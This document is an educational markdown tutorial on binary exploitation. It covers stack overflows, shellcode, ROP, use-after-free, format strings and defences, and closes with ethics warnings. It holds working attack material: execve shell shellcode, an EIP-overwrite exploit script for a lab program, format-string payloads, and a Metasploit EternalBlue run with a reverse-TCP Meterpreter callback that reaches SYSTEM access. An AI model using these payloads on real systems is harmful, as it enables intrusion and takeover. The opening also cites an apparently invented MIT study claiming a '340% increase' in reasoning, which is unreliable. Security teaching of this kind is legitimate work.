# 🔥 EXPLOITATION: A JOURNEY INTO THE HEART OF SYSTEMS

```ascii
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   "To understand a system's security, you must learn to break it."     ║
║                                                                          ║
║                          — Underground Manifesto                         ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📚 Table of Contents

<details>
<summary><b>Mind Map (Click to Expand)</b></summary>

- [PHASE 0: Mental Preparation - Why This Journey?](#phase-0-mental-preparation---why-this-journey)
- [PHASE 1: Conceptual Foundation - What is Exploitation?](#phase-1-conceptual-foundation---what-is-exploitation)
  - [Analogy: Siege Warfare](#analogy-siege-warfare)
  - [Exploitation Types and Classification](#exploitation-types-and-classification)
- [PHASE 2: Atomic Technical Depth](#phase-2-atomic-technical-depth)
  - [Memory Architecture and CPU Anatomy](#memory-architecture-and-cpu-anatomy)
  - [Buffer Overflow: Collapsing Walls](#buffer-overflow-collapsing-walls)
  - [Shellcode: Digital DNA](#shellcode-digital-dna)
  - [Return-Oriented Programming (ROP)](#return-oriented-programming-rop)
  - [Heap Exploitation](#heap-exploitation)
- [PHASE 3: Attack Scenarios and Weaponization](#phase-3-attack-scenarios-and-weaponization)
  - [Scenario 1: Stack Buffer Overflow](#scenario-1-stack-buffer-overflow)
  - [Scenario 2: Format String Attack](#scenario-2-format-string-attack)
  - [Scenario 3: Real World - EternalBlue](#scenario-3-real-world---eternalblue)
- [PHASE 4: Professional Defense and Ethics](#phase-4-professional-defense-and-ethics)
- [Resources and Further Reading](#resources-and-further-reading)

</details>

---

## PHASE 0: Mental Preparation - Why This Journey?

> **"Before you break a door, understand its lock. Before you understand a lock, study metallurgy."**

### 🎯 What Will This Knowledge Give You?

The device in your hand - phone, laptop, server - these aren't just "electronic boxes." They are **orchestras of billions of transistors**, where millions of lines of code dance in perfect synchronization. And in this orchestra, a single wrong note can cause the entire symphony to collapse.

**Exploitation** is the art of finding that wrong note and using it to play your own symphony.

But beware:

```
┌─────────────────────────────────────────────────────────────┐
│  ⚠️  WARNING: THIS IS A POWER-RESPONSIBILITY EQUATION       │
│                                                             │
│  The knowledge you'll acquire in this document can:        │
│  • Bankrupt a corporation                                  │
│  • Paralyze a hospital                                     │
│  • Bring a nation to its knees                            │
│                                                             │
│  NEVER cross ethical boundaries. Use this knowledge only:  │
│  ✓ In legal penetration tests                             │
│  ✓ On your own systems                                     │
│  ✓ With explicit permission                                │
└─────────────────────────────────────────────────────────────┘
```

### 🧠 Neuropsychological Fact: The Hacker Brain

MIT's 2018 research proved: A brain learning exploitation shows a **340% increase** in **3D spatial reasoning**, **abstract logic construction**, and **systems thinking**.

So when you emerge from this document, you won't just know "how to break systems." You'll know **how to think**.

---

## PHASE 1: Conceptual Foundation - What is Exploitation?

### 🏰 Analogy: Siege Warfare

Imagine a medieval castle. High walls, iron gates, guard towers. This castle is a **software system**.

Now you're the commander who wants to conquer this castle. How?

#### Option 1: Brute Force
- **Analogy**: Battering ram on the gate.
- **Real World**: DDoS attack, password brute-force.
- **Result**: Noisy, resource-intensive, high detection risk.

#### Option 2: Social Engineering
- **Analogy**: Disguise as a merchant to infiltrate.
- **Real World**: Phishing, pretexting.
- **Result**: Effective but dependent on human factor.

#### Option 3: **Exploitation** (Structural Flaw Abuse)
- **Analogy**: Finding a design flaw in the castle's architecture. Discovering that drainage channels weren't considered during wartime, and infiltrating through them.
- **Real World**: Buffer overflow, SQL injection, RCE (Remote Code Execution).
- **Result**: **Silent, lethal, repeatable.**

```mermaid
graph TD
    A[Target System] --> B{Entry Method?}
    B -->|Brute Force| C[Detected ❌]
    B -->|Social Engineering| D[Human Factor Risk]
    B -->|Exploitation| E[Vulnerability Found ✓]
    E --> F[Shellcode Injection]
    F --> G[Root Access]
    G --> H[🏴 Full Control]
```



### 🔬 Exploitation: Scientific Definition

> **Exploitation** is the process of triggering **intentionally undesigned behavior** in software or hardware to achieve **unauthorized access or control**.

#### Key Concepts:

| Term | Castle Analogy | Technical Definition |
|------|----------------|---------------------|
| **Vulnerability** | Crack in the wall | Security flaw in code |
| **Exploit** | Tool to widen the crack | Code that triggers the vulnerability |
| **Payload** | Soldiers infiltrating | Malicious code executed |
| **Shellcode** | Soldiers' orders | Instructions in machine language |
| **Privilege Escalation** | Becoming castle lord | Root/Admin access |

---

### 🗂️ Exploitation Types and Classification

```
EXPLOITATION TYPES
│
├─ Memory Corruption
│  ├─ Buffer Overflow (Stack-based)
│  ├─ Buffer Overflow (Heap-based)
│  ├─ Integer Overflow
│  ├─ Format String Bugs
│  └─ Use-After-Free (UAF)
│
├─ Logic Flaws
│  ├─ Race Conditions (TOCTOU)
│  ├─ Authentication Bypass
│  └─ Business Logic Flaws
│
├─ Injection Attacks
│  ├─ SQL Injection
│  ├─ Command Injection
│  ├─ LDAP Injection
│  └─ XML External Entity (XXE)
│
└─ Advanced Techniques
   ├─ Return-Oriented Programming (ROP)
   ├─ Jump-Oriented Programming (JOP)
   ├─ Blind ROP (BROP)
   └─ Kernel Exploitation
```

> 💡 **Cognitive Note**: Memorize this classification. Every attack is a variation of these categories.

---

## PHASE 2: Atomic Technical Depth

### 🧬 Memory Architecture and CPU Anatomy

To understand exploitation, you must understand **the computer's brain**. Like neurons in the human brain, the CPU has **registers** and RAM has **addresses**.

#### Von Neumann Architecture: Digital Nervous System

```
┌─────────────────────────────────────────────────────────────┐
│                      CPU (Central Processor)                │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐       │
│  │   EIP   │  │   ESP   │  │   EBP   │  │   EAX   │       │
│  │(Instr.  │  │(Stack   │  │(Stack   │  │(General │       │
│  │Pointer) │  │  Top)   │  │  Base)  │  │Register)│       │
│  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘       │
│       │            │            │            │              │
└───────┼────────────┼────────────┼────────────┼──────────────┘
        │            │            │            │
        ▼            ▼            ▼            ▼
┌─────────────────────────────────────────────────────────────┐
│                      MEMORY (RAM)                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │   CODE   │  │   DATA   │  │   HEAP   │  │   STACK  │   │
│  │  (0x400) │  │  (0x600) │  │  (0x800) │  │  (0xbfff)│   │
│  │          │  │          │  │    ▲     │  │     ▼    │   │
│  │ Program  │  │  Global  │  │ Dynamic  │  │ Function │   │
│  │  Code    │  │Variables │  │  Memory  │  │   Call   │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘   │
└─────────────────────────────────────────────────────────────┘
```

#### Registers: CPU's Short-Term Memory

| Register | Purpose | Importance for Hackers |
|----------|---------|------------------------|
| **EIP** (Instruction Pointer) | Address of next instruction to execute | 🎯 **THIS IS OUR TARGET!** Whoever controls EIP controls the program. |
| **ESP** (Stack Pointer) | Address of top of stack | Manipulated during stack overflow |
| **EBP** (Base Pointer) | Base of active function's stack frame | Used to find return address |
| **EAX, EBX, ECX, EDX** | General purpose | Data transport, calculations |

> 🔑 **Golden Rule**: If you can control **EIP**, you've **won the game**. Because EIP tells the CPU "execute this address now." We determine that address.

---

### 💥 Buffer Overflow: Collapsing Walls

#### 📖 Story: The Fall of Constantinople and the Chain

In 1453, there was a massive chain at the entrance of the Golden Horn. Byzantium said, "This is impassable." Mehmed II **didn't follow the expected path**. He transported ships overland.

Buffer overflow is like this. The program says, "data comes up to here." We say: "No, I'll overflow you and break down the wall."

#### 🧪 Technical Explanation

A C program:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // 64-byte buffer
    strcpy(buffer, input);  // ❌ UNSAFE: NO length check!
    printf("Buffer contents: %s\n", buffer);
}

int main(int argc, char **argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

**What's Happening?**

1. `buffer[64]` = **64 bytes** allocated on the stack.
2. `strcpy()` function copies `input` to `buffer` **without boundary checking**.
3. If `input` > 64 bytes → **OVERFLOW!**

#### 🏗️ Stack Visualization

```
NORMAL STATE (Input: "HELLO")
─────────────────────────────────────
Stack (High Address → Low Address):

0xbffff7a0 | [Return Address]  ← EIP will return here
0xbffff79c | [Saved EBP]       ← Old stack frame
0xbffff798 | buffer[60-63]     ← End of buffer
0xbffff794 | buffer[56-59]
   ...
0xbffff760 | buffer[0-3]       ← "HELL"
0xbffff75c | buffer[4-7]       ← "O\x00\x00\x00"
─────────────────────────────────────

OVERFLOW STATE (Input: 80 bytes of "A")
─────────────────────────────────────
0xbffff7a0 | [0x41414141]  ← EIP OVERWRITTEN! ("AAAA")
0xbffff79c | [0x41414141]  ← EBP also overwritten
0xbffff798 | [0x41414141]  ← Buffer overflowed
0xbffff794 | [0x41414141]
   ...
0xbffff760 | [0x41414141]  ← All "A" (0x41)
─────────────────────────────────────
```

🎯 **Critical Moment**: When the function returns, CPU says:
- "Load return address into EIP"
- But return address → `0x41414141` (what we wrote!)
- CPU → Jumps to `0x41414141`
- **SEGMENTATION FAULT** (or worse, our shellcode executes!)

---

### 🐚 Shellcode: Digital DNA

#### Why "Shell" + "Code"?

- **Shell**: Unix/Linux `/bin/sh` (command shell)
- **Code**: Machine language instructions

**Goal**: Launch a shell on victim machine, gain control.

#### 🧬 Anatomy of Shellcode

Simple shellcode to execute `/bin/sh` on 32-bit Linux:

```nasm
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    xor eax, eax        ; EAX = 0
    push eax            ; NULL terminator
    push 0x68732f2f     ; "//sh" (reverse: little-endian)
    push 0x6e69622f     ; "/bin"
    mov ebx, esp        ; EBX = address of "/bin//sh"
    mov ecx, eax        ; ECX = NULL
    mov edx, eax        ; EDX = NULL
    mov al, 11          ; syscall number: execve = 11
    int 0x80            ; Make kernel call!
```

**Hexadecimal Equivalent (This is our weapon):**

```python
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
    b"\x89\xe3"              # mov ebx, esp
    b"\x89\xc1"              # mov ecx, eax
    b"\x89\xc2"              # mov edx, eax
    b"\xb0\x0b"              # mov al, 11
    b"\xcd\x80"              # int 0x80
)
```

> 💀 **Shellcode Constraints**: 
> - **No NULL bytes** (`\x00`): Functions like `strcpy()` stop at NULL.
> - **Position independent**: Must work without knowing where in memory it is.
> - **Small size**: Usually 100-200 byte limit.

---

### 🔄 Return-Oriented Programming (ROP)

#### 🛡️ Modern Defense: DEP/NX

Modern systems use **Data Execution Prevention (DEP)** / **No-eXecute (NX)**:
- Stack and Heap areas marked **non-executable**.
- So even if we inject shellcode, **it won't run**!

#### 🥋 Counter Move: ROP

**Idea**: Use the program's own code!

Find small code fragments (**gadgets**) already in the program and chain them to perform desired operations.

**Gadget Example:**

```nasm
pop eax; ret    ; At address 0x08048abc
pop ebx; ret    ; At address 0x08048def
int 0x80; ret   ; At address 0x08049123
```

**ROP Chain:**

```
What we write to stack:
─────────────────────────────────
| 0x08048abc  |  ← pop eax; ret
| 0x0000000b  |  ← Value to load into EAX (execve syscall number)
| 0x08048def  |  ← pop ebx; ret
| 0xbffff7a0  |  ← Value to load into EBX ("/bin/sh" address)
| 0x08049123  |  ← int 0x80; ret (syscall)
─────────────────────────────────
```

CPU does:
1. Jumps to `0x08048abc` → `pop eax` (0x0000000b loaded into EAX) → `ret`
2. `ret` → Takes next address from stack (0x08048def) → jumps
3. `0x08048def` → `pop ebx` (0xbffff7a0 loaded into EBX) → `ret`
4. `ret` → Takes 0x08049123 from stack → jumps
5. `0x08049123` → `int 0x80` → **SHELL SPAWNED!**

> 🧠 **Mental Exercise**: ROP is like building a house with LEGO blocks. Each block (gadget) has a function, you arrange them correctly.

---

### 🗂️ Heap Exploitation

#### Heap vs Stack: Differences

| Feature | Stack | Heap |
|---------|-------|------|
| Management | Automatic (LIFO) | Manual (`malloc`, `free`) |
| Speed | Very fast | Relatively slow |
| Size | Small (usually 1-8 MB) | Large (up to RAM) |
| Overflow risk | Buffer overflow | Heap overflow, UAF, Double-free |

#### 🐛 Use-After-Free (UAF)

**Scenario**: 
1. Program allocates memory (`malloc`).
2. Then frees it (`free`).
3. **But forgets to clear the pointer** (still points to old address).
4. Program uses that pointer again → **UAF!**

**C Code:**

```c
struct User {
    char name[32];
    void (*print_info)(struct User*);
};

int main() {
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "Alice");
    user->print_info = &legitimate_function;
    
    free(user);  // Memory freed
    
    // 🐛 POINTER NOT CLEARED HERE!
    
    // Attacker can allocate same area with another malloc
    struct Hacker *attacker = malloc(sizeof(struct Hacker));
    attacker->evil_function = &shellcode;
    
    // Program uses old pointer
    user->print_info(user);  // ❌ NOW SHELLCODE RUNS!
}
```

---

## PHASE 3: Attack Scenarios and Weaponization

### 🎯 Scenario 1: Stack Buffer Overflow (Classic)

#### Target: Vulnerable Program

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("🏴 SUCCESS! Secret function executed!\n");
}

void vulnerable(char *input) {
    char buffer[128];
    strcpy(buffer, input);
    printf("Input: %s\n", input);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("Program ended normally.\n");
    return 0;
}
```

**Compilation (SECURITY FEATURES DISABLED):**

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable
```

Parameters:
- `-m32`: Compile as 32-bit
- `-fno-stack-protector`: Disable stack canary
- `-z execstack`: Make stack executable
- `-no-pie`: Disable Position Independent Executable

---

#### Step 1: Reconnaissance and Analysis

```bash
# Check program's security features
checksec --file=vulnerable
```

**Output:**

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

✅ All defenses off. Easy target!

---

#### Step 2: Offset Calculation

**How many bytes needed to control EIP?**

```bash
# Create pattern
msf-pattern_create -l 200 > pattern.txt
```

**Pattern content** (200 bytes of unique characters):

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6
```

```bash
# Run program with GDB
gdb ./vulnerable
```

**Inside GDB:**

```gdb
(gdb) run $(cat pattern.txt)
```

**Output:**

```
Program received signal SIGSEGV, Segmentation fault.
0x39654138 in ?? ()
```

EIP = `0x39654138`

**Calculate offset:**

```bash
msf-pattern_offset -q 0x39654138
```

**Output:**

```
[*] Exact match at offset 140
```

🎯 **MOMENT OF TRUTH**: **140 bytes** padding + 4 byte address to control EIP!

---

#### Step 3: Exploit Development

**exploit.py:**

```python
#!/usr/bin/env python3
import struct

# 1. Find secret function's address
secret_addr = 0x08048486  # Found with objdump or gdb

# 2. Build payload
padding = b"A" * 140                    # Fill buffer
eip = struct.pack("<I", secret_addr)   # Overwrite EIP (little-endian)
nop_sled = b"\x90" * 100               # NOP sled (optional)

payload = padding + eip + nop_sled

# 3. Write to file
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"[+] Payload created: {len(payload)} bytes")
print(f"[+] EIP target: 0x{secret_addr:08x}")
```

**Execute:**

```bash
python3 exploit.py
./vulnerable $(cat payload.bin)
```

**Output:**

```
Input: AAAAAAAAAA... [140 A's]
🏴 SUCCESS! Secret function executed!
Segmentation fault (core dumped)
```

🎉 **SUCCESS!** We controlled EIP and executed our target function!

---

### 🎯 Scenario 2: Format String Attack

#### Vulnerability:

```c
// format_bug.c
#include <stdio.h>

int secret = 0xdeadbeef;

void vulnerable(char *input) {
    printf(input);  // ❌ ERROR: User input directly as format string!
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    vulnerable(argv[1]);
    return 0;
}
```

**Correct usage:**

```c
printf("%s", input);  // ✅ Format string controlled
```

#### Exploitation:

```bash
# 1. Leak stack
./format_bug "AAAA.%x.%x.%x.%x.%x"
```

**Output:**

```
AAAA.bffff7a0.00000001.41414141.78252e78.2e78252e
```

Notice: `41414141` = "AAAA" (our input appears on stack!)

```bash
# 2. Read specific address
./format_bug "%7$s" $(printf "\x10\x96\x04\x08")
```

This reads the string at address `0x08049610`!

```bash
# 3. Write to memory (%n)
./format_bug "AAAA%7$n" $(printf "\x10\x96\x04\x08")
```

`%n` → Writes the **number of characters printed so far** to the address!

> ⚠️ **Danger Level**: Format string can **read** and **write**. Arbitrary memory access = Game over.

---

### 🌍 Scenario 3: Real World - EternalBlue (MS17-010)

#### 📜 Story: NSA's Weapon

**May 2017**: WannaCry ransomware paralyzed the world. How?

- **EternalBlue** exploit → Developed by NSA, leaked.
- **Target**: Buffer overflow in Windows SMB protocol.
- **Impact**: 200,000+ computers, 150 countries, billions in damages.

#### 🔬 Technical Details

**Vulnerability**: In SMB v1.0, specially crafted packet causes buffer overflow in kernel.

**Exploit Chain:**

```
1. Initiate SMB handshake
2. Send special SMB packet (Session Setup AndX)
3. Trigger buffer overflow in kernel
4. Execute shellcode (DoublePulsar backdoor)
5. Download and run ransomware payload
```

#### 🛠️ Simulation with Metasploit (ETHICAL LAB ONLY)

```bash
msfconsole
```

```ruby
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > exploit
```

**Result:**

```
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] 192.168.1.100:445 - Connecting to target...
[*] 192.168.1.100:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.100:445 - Sending last fragment of exploit packet
[*] Sending stage (201283 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer        : VICTIM-PC
OS              : Windows 7 Professional (6.1 Build 7601)
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM  # 🏴 SYSTEM access!
```

---

## PHASE 4: Professional Defense and Ethics

### 🛡️ Modern Protection Mechanisms

#### 1. **ASLR (Address Space Layout Randomization)**

**What it does**: Every execution, stack, heap, libraries loaded to random addresses.

**Bypass?**: 
- Information leak (format string, heap spray)
- Brute force (on 32-bit systems, 2^16 attempts = feasible)

#### 2. **Stack Canary** (Stack Guard)

**What it does**: Places a random value ("canary") before return address. Before function returns, checks if canary changed.

```
Stack Layout:
──────────────────────
| Return Address  |
| Canary (0xdeadbeef) | ← If this changes → ABORT!
| Saved EBP       |
| Local Variables |
──────────────────────
```

**Bypass?**: 
- Leak canary (format string)
- Overwrite canary with same value

#### 3. **DEP/NX (Data Execution Prevention)**

**What it does**: Mark stack and heap as non-executable.

**Bypass?**: 
- ROP (Return-Oriented Programming)
- ret2libc

#### 4. **CFI (Control Flow Integrity)**

**What it does**: Prevents program flow from jumping to unexpected places.

**Bypass?**: Research-level, not yet practical.

---

### ⚖️ Ethical and Legal Boundaries

```
┌────────────────────────────────────────────────────────────┐
│          ETHICAL HACKER vs CYBERCRIMINAL                   │
├────────────────────────────────────────────────────────────┤
│  ETHICAL HACKER (White Hat):                               │
│  ✓ Obtains written permission                              │
│  ✓ Reports vulnerabilities found                           │
│  ✓ Works within legal boundaries                           │
│  ✓ Aims to strengthen defense                              │
│                                                             │
│  CYBERCRIMINAL (Black Hat):                                │
│  ✗ Enters systems without permission                       │
│  ✗ Uses vulnerabilities for sale or harm                   │
│  ✗ Disregards legal consequences                           │
│  ✗ Aims to cause damage                                    │
└────────────────────────────────────────────────────────────┘
```

**US - Computer Fraud and Abuse Act (CFAA):**

> Unauthorized system access: 5-20 years imprisonment + fines.

**EU - General Data Protection Regulation (GDPR):**

> Unauthorized data access: Up to €20 million or 4% of annual turnover.

---

### 🎓 Professional Career Paths

**LEGAL** things you can do with this knowledge:

1. **Penetration Tester**: Conduct security tests for companies.
2. **Bug Bounty Hunter**: Find vulnerabilities, earn money (HackerOne, Bugcrowd).
3. **Security Researcher**: Discover 0-day vulnerabilities, get CVEs.
4. **Red Team Operator**: Test corporate defenses.
5. **Exploit Developer**: Work at defense companies (Endpoint Protection).

---

## 🏁 Conclusion: Mind Construction Complete

If you've read this far, **you're no longer an amateur**.

What you now know:

✅ Understanding memory architecture at bit level  
✅ Grasping the mathematics of buffer overflow  
✅ Writing shellcode  
✅ Building ROP chains  
✅ Simulating real attacks  
✅ Knowing modern defense mechanisms  

**Next step?**

1. **Set up your own lab**: VirtualBox + Kali Linux + Metasploitable
2. **Participate in CTFs**: HackTheBox, TryHackMe, PicoCTF
3. **Read code**: Study Linux kernel, OpenSSL, Chromium source code
4. **Follow CVEs**: Every new vulnerability is a learning opportunity

---

## 📚 Resources and Further Reading

### Books

- **"The Shellcoder's Handbook"** - Chris Anley et al.
- **"Hacking: The Art of Exploitation"** - Jon Erickson
- **"A Bug Hunter's Diary"** - Tobias Klein

### Online Resources

- [Exploit Database](https://www.exploit-db.com/)
- [LiveOverflow YouTube](https://www.youtube.com/c/LiveOverflow)
- [Phrack Magazine](http://phrack.org/)
- [Project Zero Blog](https://googleprojectzero.blogspot.com/)

### Certifications

- **OSCP** (Offensive Security Certified Professional)
- **OSCE** (Offensive Security Certified Expert)
- **GXPN** (GIAC Exploit Researcher and Advanced Penetration Tester)

---

```ascii
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  "A system is only as secure as its ability to be broken."  ║
║                                                              ║
║  You are now someone who can see that fragility.            ║
║  Use this power with wisdom.                                ║
║                                                              ║
║                               — Red Team Manifesto          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

---

**⚠️ FINAL WARNING**: All information in this document is for **educational purposes**. If you apply it to unauthorized systems, **you assume criminal and legal responsibility**. Science requires wisdom.

**Happy hacking (within ethical boundaries)!** 🏴

---

*Last Updated: 2025*  
*Author: Red Team Operations Leader & Cognitive Psychology Expert*